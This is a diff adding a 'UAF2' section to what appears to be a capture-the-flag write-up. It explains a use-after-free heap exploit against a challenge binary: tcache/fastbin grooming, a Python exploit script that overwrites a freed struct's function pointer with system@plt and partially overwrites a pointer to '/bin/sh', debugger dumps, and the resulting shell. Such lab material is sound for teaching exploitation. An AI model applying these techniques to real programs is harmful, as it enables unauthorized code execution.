@@ -307,3 +307,115 @@ we have size 20 ( <= 0x20) for our `name` buffer and `p64(sys_addr)` as the `nam
 03:0018│  0x95702a8 ◂— 0xa /* '\n' */
 ```
 Still remember that this chunk was previously a chunk used for `animal` struct whose has a pointer from the `zoo.animal[0]` that is not set to `NULL`? Which means if we now `report_name` on `zone 0`, this `name` buffer chunk would be activated as if it is the `animal` struct chunk with `get_shell` at the first struct member field being its function pointer!! In order words, we get the shell if we `report_name` at this particular moment.
+
+
+# UAF2
+
+uaf2 is basically uaf with the following changes in the source code:
+- fixed `name` buffer size
+```c
+animal->name = (char*) malloc(0x18);
+```
+- get_shell function erased
+
+So here's the new attack strategy:
+1. Still, somehow allocate the chunk that is previously used for the `animal` struct, to be used for new `name` buffer of our latest `animal`. It's just that here that "somehow" is even more trickier.
+2. Name that as the address to `system@plt`. And somehow put `"/bin/sh"` into it as the first argument
+```c
+void print(char* str) {
+    system("/usr/bin/date +\"%Y/%m/%d %H:%M.%S\" | tr -d '\n'");
+    printf(": %s\n", str);
+}
+```
+Since `system` has been directly used in the program before, we got the plt address to it. There's no need to leak the libc address for `system`
+3. report_name
+## Exploit
+The hardest step this time is step 1, but at least is main goal is still the same. That is, we need to allocate a chunk previously used as `animal` struct chunk to be used for `name` buffer chunk of the name animal.
+Now imagine if we add 3 animals and free all of them, the tcachebins should look like something like this:
+```
+tcachebins   animal 	  name          animal        name          animal        name
+0x20 [  6]: 0x11d75320 —▸ 0x11d75340 —▸ 0x11d752e0 —▸ 0x11d75300 —▸ 0x11d752a0 —▸ 0x11d752c0 ◂— 0
+```
+What I have marked above the addresses i.e. `animal` or `name` represents what they were used for before being freed. For example, `name` means they were previously heap chunk used for `name` buffer.
+Because of the FILO (first in last out) feature of tcachebin, if we add a new animal where `animal` struct chunk would be allocate earlier than `name`  buffer chunk. What would happen is that `0x11d75320` previously used for `animal` struct would then be used for new `animal` struct chunk, `0x11d75340` previously used for `name` buffer would then be used for our new `name` buffer chunk. Which means, absolutely nothing special happens as we cannot align chunk previously used for `animal` struct with our new `name` buffer and overwrite the function pointer.
+
+But what if we free just one more chunk into the free list? It would look like this:
+```
+tcachebins   name        animal 	name          animal        name          animal        name
+0x20 [  7]: <address1> —▸ 0x11d75320 —▸ 0x11d75340 —▸ 0x11d752e0 —▸ 0x11d75300 —▸ 0x11d752a0 —▸ 0x11d752c0 ◂— 0
+
+fastbins animal	
+0x20:    <address2> ◂— 0
+
+```
+The fact that tcachebins becomes full at 7 entries and one freed chunk (previously used for `animal` struct) goes into the fastbins, would disalign the original ordering of the tcachebin. 
+
+Now if we add a new animal where `animal` struct chunk would be allocated earlier than `name` buffer chunk. What would happen now is that `<address1>` would was previously a chunk used for `name` buffer, would then be used for new `animal` struct chunk. `0x11d75320` previously used for `animal` struct, would then be used for new `name` buffer!!Which means we can overwrite the function pointer of a chunk having duo roles of being a `name` buffer as well as a `animal` struct since `zoo.animal[idx]` was not set to null when it was freed. Here the `idx` should be `2` if it was indeed the third `animal` being freed, i.e. if the ordering of freeing `animals` looks like the following in python script:
+```py
+add_animal("A" * 0x18)
+add_animal("B" * 0x18)
+add_animal("C" * 0x18)
+add_animal("D" * 0x18)
+
+
+remove_animal(b"0")
+remove_animal(b"1")
+remove_animal(b"2")
+remove_animal(b"3")
+```
+### Getting "/bin/sh" into system
+Now that we can overwrite `system` as the function pointer of a freed `animal` struct chunk that can still be called as the pointer from `zoo.animal[idx]` was not set to null. There's one more thing to be done, that is, getting "/bin/sh" into the `system` function as the first argument.   
+
+Now let's go back to revise that:
+```
+zoo.animals[choice]->speak(zoo.animals[choice]->name);
+```
+in `report_name`, the `speak` action gets the `name` buffer as the first argument. Which means, what we need to do, is to turn our `name` buffer to be an address that points to `"/bin/sh"`. We can do this easily as we got `0x18` to write for the name buffer. In order words, we can overwrite the address that `name` field in the `animal` struct points to. after a padding of 8 bytes. Here is the visualization:
+```
+pwndbg> tele 0x6073310
+00:0000│  0x6073310 ◂— 'BBBBBBBB!'
+01:0008│  0x6073318 ◂— 0x21 /* '!' */
+02:0010│  0x6073320 —▸ 0x401120 (system@plt) ◂— endbr64 
+03:0018│  0x6073328 ◂— (8 bytes padding here to reach the name field)
+04:0020│  0x6073330 —▸ 0x6073340 —▸ 0x6075293 ◂— 0 (name field here, we can change the address 0x6073340 to where our "/bin/sh" locates)
+```
+Here's how the exploit look like in python:
+```py
+add_animal("A" * 0x18)
+add_animal("B" * 0x18)
+add_animal("C" * 0x10 + "/bin/sh\x00")
+add_animal("D" * 0x18)
+
+
+remove_animal(b"0")
+remove_animal(b"1")
+remove_animal(b"2")
+remove_animal(b"3")
+
+sys_addr = 0x401120
+add_animal(p64(sys_addr) + b'A' * 0x8 + b'\x50')
+```
+It is by pure observation that "/bin/sh\x00" would be located at heap chunk address ending with 0x350:
+```
+0x35308350 ◂— 0x68732f6e69622f /* '/bin/sh' */
+```
+then, we change the last byte of the address that `name` field in the `animal` struct chunk we overwritten, to `\x50`:
+```
+b'A' * 0x8 + b'\x50')
+```
+it looks like this internally:
+```
+02:0010│  0x7dbb320 —▸ 0x401120 (system@plt) ◂— endbr64 
+03:0018│  0x7dbb328 ◂— 0x4141414141414141 ('AAAAAAAA')
+04:0020│  0x7dbb330 —▸ 0x7dbb350 ◂— 0x68732f6e69622f /* '/bin/sh' */
+```
+finally when we `report_name`, the program does `speak(name)` but actually it does `system("/bin/sh")`!!!!
+Therefore we get the shell!!!!!!!!!!!
+```
+2025/02/17 09:43.36: Zone number? (0-9)
+> $ 2
+$ ls
+assembly  core  exp.py  ld-linux-x86-64.so.2  libc.so.6  solve.py  zoo  zoo.c
+$  
+```
+
